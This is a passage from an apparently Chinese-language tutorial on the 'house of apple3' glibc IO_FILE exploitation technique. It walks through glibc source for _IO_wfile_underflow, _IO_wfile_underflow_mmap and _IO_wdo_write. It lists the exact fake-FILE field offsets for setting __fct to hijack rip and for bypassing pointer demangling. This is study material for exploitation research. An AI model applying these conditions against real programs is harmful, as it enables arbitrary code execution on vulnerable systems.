class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_iconv_t __cd_in;</span><br><span class="line">  _IO_iconv_t __cd_out;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">step</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step_data</span> <span class="title">step_data</span>;</span></span><br><span class="line">&#125; _IO_iconv_t;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_loaded_object</span> *__<span class="title">shlib_handle</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *__modname;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* For internal use by glibc.  (Accesses to this member must occur</span></span><br><span class="line"><span class="comment">     when the internal __gconv_lock mutex is acquired).  */</span></span><br><span class="line">  <span class="type">int</span> __counter;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *__from_name;</span><br><span class="line">  <span class="type">char</span> *__to_name;</span><br><span class="line"></span><br><span class="line">  __gconv_fct __fct;</span><br><span class="line">  __gconv_btowc_fct __btowc_fct;</span><br><span class="line">  __gconv_init_fct __init_fct;</span><br><span class="line">  __gconv_end_fct __end_fct;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Information about the number of bytes needed or produced in this</span></span><br><span class="line"><span class="comment">     step.  This helps optimizing the buffer sizes.  */</span></span><br><span class="line">  <span class="type">int</span> __min_needed_from;</span><br><span class="line">  <span class="type">int</span> __max_needed_from;</span><br><span class="line">  <span class="type">int</span> __min_needed_to;</span><br><span class="line">  <span class="type">int</span> __max_needed_to;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flag whether this is a stateful encoding or not.  */</span></span><br><span class="line">  <span class="type">int</span> __stateful;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *__data;		<span class="comment">/* Pointer to step-local data.  */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *__outbuf;    <span class="comment">/* Output buffer for this step.  */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *__outbufend; <span class="comment">/* Address of first byte after the output</span></span><br><span class="line"><span class="comment">				 buffer.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Is this the last module in the chain.  */</span></span><br><span class="line">  <span class="type">int</span> __flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Counter for number of invocations of the module function for this</span></span><br><span class="line"><span class="comment">     descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> __invocation_counter;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flag whether this is an internal use of the module (in the mb*towc*</span></span><br><span class="line"><span class="comment">     and wc*tomb* functions) or regular with iconv(3).  */</span></span><br><span class="line">  <span class="type">int</span> __internal_use;</span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> *__statep;</span><br><span class="line">  <span class="type">__mbstate_t</span> __state;	<span class="comment">/* This element must not be used directly by</span></span><br><span class="line"><span class="comment">			   any module; always use STATEP!  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div> <code>house of apple3</code>的利用主要关注以下三个函数：<code>__libio_codecvt_out</code>、<code>__libio_codecvt_in</code>和<code>__libio_codecvt_length</code>。三个函数的利用点都差不多，以<code>__libio_codecvt_in</code>为例，源码分析如下： <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span></span></span><br><span class="line"><span class="class">__<span class="title">libio_codecvt_in</span> (<span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">codecvt</span>, __<span class="title">mbstate_t</span> *<span class="title">statep</span>,</span></span><br><span class="line"><span class="class">            <span class="title">const</span> <span class="title">char</span> *<span class="title">from_start</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">from_end</span>,</span></span><br><span class="line"><span class="class">            <span class="title">const</span> <span class="title">char</span> **<span class="title">from_stop</span>,</span></span><br><span class="line"><span class="class">            <span class="title">wchar_t</span> *<span class="title">to_start</span>, <span class="title">wchar_t</span> *<span class="title">to_end</span>, <span class="title">wchar_t</span> **<span class="title">to_stop</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">result</span>;</span></span><br><span class="line">  <span class="comment">// gs 源自第一个参数</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">gs</span> =</span> codecvt-&gt;__cd_in.step;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  <span class="type">size_t</span> dummy;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *from_start_copy = (<span class="type">unsigned</span> <span class="type">char</span> *) from_start;</span><br><span class="line"> </span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbuf = (<span class="type">unsigned</span> <span class="type">char</span> *) to_start;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbufend = (<span class="type">unsigned</span> <span class="type">char</span> *) to_end;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__statep = statep;</span><br><span class="line"> </span><br><span class="line">  __gconv_fct fct = gs-&gt;__fct;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="comment">// 如果gs-&gt;__shlib_handle不为空，则会用__pointer_guard去解密</span></span><br><span class="line">  <span class="comment">// 这里如果可控，设置为NULL即可绕过解密</span></span><br><span class="line">  <span class="keyword">if</span> (gs-&gt;__shlib_handle != <span class="literal">NULL</span>)</span><br><span class="line">    PTR_DEMANGLE (fct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">// 这里有函数指针调用</span></span><br><span class="line">  <span class="comment">// 这个宏就是调用fct(gs, ...)</span></span><br><span class="line">  status = DL_CALL_FCT (fct,</span><br><span class="line">            (gs, &amp;codecvt-&gt;__cd_in.step_data, &amp;from_start_copy,</span><br><span class="line">             (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) from_end, <span class="literal">NULL</span>,</span><br><span class="line">             &amp;dummy, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">       <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 其中，<code>__gconv_fct</code>和<code>DL_CALL_FCT</code>被定义为： <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Type of a conversion function.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*__gconv_fct)</span> <span class="params">(<span class="keyword">struct</span> __gconv_step *, <span class="keyword">struct</span> __gconv_step_data *,</span></span><br><span class="line"><span class="params">                <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> **, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *,</span></span><br><span class="line"><span class="params">                <span class="type">unsigned</span> <span class="type">char</span> **, <span class="type">size_t</span> *, <span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DL_CALL_FCT</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_CALL_FCT(fct, args) fct args</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div> #### <code>_IO_wfile_underflow</code></p>
<ul>
<li>调用链</li>
</ul>
<ol type="1">
<li><p><code>_IO_wfile_underflow</code> <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">status</span>;</span></span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 需要进入这个分支</span></span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">      <span class="type">const</span> <span class="type">char</span> *read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">    <span class="comment">// 需要一路调用到这里</span></span><br><span class="line">      status = __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                   fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">                   &amp;read_stop,</span><br><span class="line">                   fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">                   fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">                   &amp;fp-&gt;_wide_data-&gt;_IO_read_end);</span><br><span class="line">           <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p></li>
<li><p><code>__libio_codecvt_in</code></p></li>
<li><p><code>DL_CALL_FCT</code></p></li>
<li><p><code>gs = fp-&gt;_codecvt-&gt;__cd_in.step</code></p></li>
<li><p><code>*(gs-&gt;__fct)(gs)</code></p></li>
</ol>
<p>综上所述： * <code>_flags</code>设置为<code>~(4 | 0x10)</code> * <code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow</code>即可 * <code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code> * <code>_wide_data</code>保持默认，或者设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code> * <code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code> * <code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code> * <code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code> * <code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code> * <code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制</p>
<h4 id="io_wfile_underflow_mmap-1"><code>_IO_wfile_underflow_mmap</code></h4>
<ul>
<li>调用链</li>
</ul>
<ol type="1">
<li><code>_IO_wfile_underflow_mmap</code> <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *read_stop;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="comment">// 最好不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 最好不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">      _IO_wdoallocbuf (fp);<span class="comment">// 需要走到这里</span></span><br><span class="line">    &#125;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 需要调用到这里</span></span><br><span class="line">  __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">              fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">              &amp;read_stop,</span><br><span class="line">              fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">              fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">              &amp;fp-&gt;_wide_data-&gt;_IO_read_end);</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 满足条件：</li>
</ol>
<ul>
<li><code>fp-&gt;_flags &amp; _IO_NO_READS == 0</code></li>
<li><code>fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end</code></li>
<li><code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code></li>
<li><code>fp-&gt;_wide_data-&gt;_IO_buf_base != NULL</code></li>
</ul>
<ol start="2" type="1">
<li><p><code>__libio_codecvt_in</code></p></li>
<li><p><code>DL_CALL_FCT</code></p></li>
<li><p><code>gs = fp-&gt;_codecvt-&gt;__cd_in.step</code></p></li>
<li><p><code>*(gs-&gt;__fct)(gs)</code></p></li>
</ol>
<p>综上所述： * <code>_flags</code>设置为<code>~4</code> * <code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可 * <code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code> * <code>_wide_data</code>保持默认，或者设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code> * <code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code> * <code>_wide_data-&gt;_IO_buf_base</code>设置为非<code>0</code>，即满足<code>*(A + 0x30) != 0</code> * <code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code> * <code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code> * <code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code> * <code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>，如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制</p>
<h4 id="io_wdo_write"><code>_IO_wdo_write</code></h4>
<ul>
<li>调用链</li>
</ul>
<ol type="1">
<li><code>_IO_new_file_sync</code> <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> delta;</span><br><span class="line">  <span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(fp)) <span class="keyword">return</span> EOF;<span class="comment">//调用到这里</span></span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 满足条件：</li>
</ol>
<ul>
<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>
</ul>
<ol start="2" type="1">
<li><code>_IO_do_flush</code> <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  ((_f)-&gt;_mode &lt;= 0                                  \</span></span><br><span class="line"><span class="meta">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,                      \</span></span><br><span class="line"><span class="meta">          (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)              \</span></span><br><span class="line"><span class="meta">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,              \</span></span><br><span class="line"><span class="meta">           ((_f)-&gt;_wide_data-&gt;_IO_write_ptr                  \</span></span><br><span class="line"><span class="meta">            - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span></span><br></pre></td></tr></table></figure></div> 满足条件：</li>
</ol>
<ul>
<li><code>fp-&gt;_mode &gt; 0</code></li>
<li>此时的第二个参数为<code>fp-&gt;_wide_data-&gt;_IO_write_base</code></li>
<li>第三个参数为<code>fp-&gt;_wide_data-&gt;_IO_write_ptr - fp-&gt;_wide_data-&gt;_IO_write_base</code></li>
</ul>
<ol start="3" type="1">
<li><code>_IO_wdo_write</code> <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_wdo_write (FILE *fp, <span class="type">const</span> <span class="type">wchar_t</span> *data, <span class="type">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 第三个参数必须要大于0</span></span><br><span class="line">  <span class="keyword">if</span> (to_do &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr</span><br><span class="line">      &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;<span class="comment">// 不能进入这个分支</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_new_do_write (fp, fp-&gt;_IO_write_base,</span><br><span class="line">                fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) == EOF)</span><br><span class="line">        <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* Now convert from the internal format into the external buffer.  */</span></span><br><span class="line">    <span class="comment">// 需要调用到这里</span></span><br><span class="line">      result = __libio_codecvt_out (cc, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                    data, data + to_do, &amp;new_data,</span><br><span class="line">                    write_ptr,</span><br><span class="line">                    buf_end,</span><br><span class="line">                    &amp;write_ptr);</span><br><span class="line">          <span class="comment">//......</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 满足条件：</li>
</ol>
<ul>
<li><code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code></li>
<li><code>fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base</code>为假</li>
</ul>
<ol start="4" type="1">
<li><p><code>__libio_codecvt_out</code></p></li>
<li><p><code>DL_CALL_FCT</code></p></li>
<li><p>`gs = fp-&gt;_codecvt-&gt;__cd_out.step</p></li>
<li><p><code>*(gs-&gt;__fct)(gs)</code></p></li>
</ol>
